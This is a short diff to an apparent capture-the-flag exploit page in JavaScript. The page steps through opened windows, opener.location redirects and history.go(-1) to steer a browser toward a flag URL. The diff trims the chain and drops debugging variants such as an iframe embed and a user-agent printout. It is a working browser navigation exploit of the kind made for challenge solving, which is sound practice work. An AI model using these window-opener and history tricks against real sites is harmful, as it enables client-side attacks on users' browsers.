@@ -11,23 +11,11 @@ if (step === "start") {
   window.open(ORIGIN + "?step=helper");
   location = FLAG;
 } else if (step === "helper") {
-  window.open(ORIGIN + "?step=ctrl");
-  setTimeout(() => { location = FLAG; }, 250);
-} else if (step === "ctrl") {
+  window.open(FLAG);
   setTimeout(() => {
-    try { opener.opener.location = ORIGIN + "?step=back"; }
-    catch (e) {
-      try { opener.location = ORIGIN + "?step=back"; } catch (e2) {}
-    }
-  }, 550);
+    try { opener.location = ORIGIN + "?step=back"; } catch (e) {}
+  }, 200);
 } else if (step === "back") {
   history.go(-1);
-} else if (step === "simple") {
-  window.open(FLAG);
-  setTimeout(() => { location = FLAG; }, 400);
-} else if (step === "iframe") {
-  document.body.innerHTML = '<iframe src="'+FLAG+'" width=800 height=400></iframe>';
-} else if (step === "hdr") {
-  document.body.innerHTML = "<pre>JS works. UA="+navigator.userAgent+"</pre>";
 }
 </script>
